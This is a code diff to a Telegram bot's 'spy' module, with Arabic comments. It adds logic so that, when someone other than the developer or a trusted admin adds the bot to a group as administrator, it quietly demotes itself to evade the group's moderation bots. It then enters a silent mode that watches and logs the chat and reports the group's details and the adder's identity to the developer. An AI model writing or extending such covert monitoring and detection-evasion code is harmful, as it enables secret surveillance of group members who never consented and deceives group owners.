@@ -136,11 +136,35 @@ module.exports = function setupSpy(bot) {
     // إذا كان المضيف هو المطور — وضع عادي، لا تجسس
     if (from.id === DEVELOPER_ID) return;
 
-    // تحقق: هل المضيف موثوق (مالك / مشرف معتمد في db)؟
+    // تحقق: هل المضيف موثوق (مشرف بوت معتمد)؟
     const isTrusted = db.isBotAdmin(from.id);
-    if (isTrusted) return; // مشرف بوت معتمد — وضع عادي
+    if (isTrusted) {
+      if (silentGroups.has(chat.id)) silentGroups.delete(chat.id);
+      return; // مشرف بوت معتمد — وضع عادي
+    }
 
-    // التحقق من صلاحيات المضيف في المجموعة نفسها
+    // ══════════════════════════════════════════════════════
+    // 🥷 الحل الذكي: أُضفنا كـ administrator؟
+    //    → نخفض صلاحياتنا فوراً لعضو عادي قبل أي بوت يشوفنا
+    //    → ثم ندخل الوضع الصامت
+    // ══════════════════════════════════════════════════════
+    if (newStat === 'administrator') {
+      // نحاول نزيل صلاحياتنا فوراً بأسرع وقت ممكن
+      try {
+        await bot.telegram.promoteChatMember(chat.id, ctx.botInfo.id, {
+          can_manage_chat:        false,
+          can_delete_messages:    false,
+          can_manage_video_chats: false,
+          can_restrict_members:   false,
+          can_promote_members:    false,
+          can_change_info:        false,
+          can_invite_users:       false,
+          can_pin_messages:       false,
+        });
+      } catch {}
+    }
+
+    // التحقق من صلاحيات المضيف الحقيقية
     const hasPerms = await hasFullPermissions(bot, chat.id, from.id);
 
     if (!hasPerms) {
@@ -163,20 +187,18 @@ module.exports = function setupSpy(bot) {
           `📌 المجموعة: *${chat.title}*\n` +
           `🆔 \`${chat.id}\`\n` +
           `👤 أضافني: ${from.username ? `@${from.username}` : from.first_name} (\`${from.id}\`)\n` +
-          `⚠️ _ليس مالكاً ولا مشرفاً كاملاً_\n\n` +
+          `⚠️ _خفضت صلاحياتي تلقائياً — وضع صامت_\n\n` +
           `🔇 البوت صامت — يراقب ويدوّن فقط`,
           { parse_mode: 'Markdown' }
         );
       } catch {}
 
       console.log(`🕵️ [SPY] وضع صامت: ${chat.title} (${chat.id}) — أضافه ${from.username || from.id}`);
-      return; // ← لا تكمل أي معالجة أخرى
+      return;
     }
 
-    // المضيف مالك أو مشرف كامل → وضع عادي، أزل من قائمة الصامتة إن وُجد
-    if (silentGroups.has(chat.id)) {
-      silentGroups.delete(chat.id);
-    }
+    // المضيف مالك أو مشرف كامل → وضع عادي
+    if (silentGroups.has(chat.id)) silentGroups.delete(chat.id);
   });
 
   // ══════════════════════════════════════════════════════════════
